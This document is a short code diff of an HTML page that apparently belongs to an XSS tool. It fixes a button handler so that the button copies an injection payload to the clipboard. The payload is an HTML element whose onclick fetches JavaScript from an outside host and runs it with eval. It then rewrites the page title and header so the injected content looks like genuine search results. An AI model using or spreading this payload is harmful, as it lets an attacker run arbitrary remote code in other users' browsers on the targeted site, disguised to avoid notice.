@@ -14,7 +14,7 @@
           console.error('Failed to copy text: ', err);
         }
       }
-      document.getElementById("htmlInject").addEventListener("click", copyToClipboard(`<x onclick="fetch('https://tebothegebo.github.io/unc-xss/htmlInject.js').then(r => r.text()).then(eval); document.title='You searched for Events'; document.getElementsByClassName('page-header')[0].childNodes[1].innerText = 'Search Results for Events'">Events`));
+      document.getElementById("htmlInject").addEventListener("click", function() {copyToClipboard(`<x onclick="fetch('https://tebothegebo.github.io/unc-xss/htmlInject.js').then(r => r.text()).then(eval); document.title='You searched for Events'; document.getElementsByClassName('page-header')[0].childNodes[1].innerText = 'Search Results for Events'">Events`)});
     </script>
   </body>
 </html>
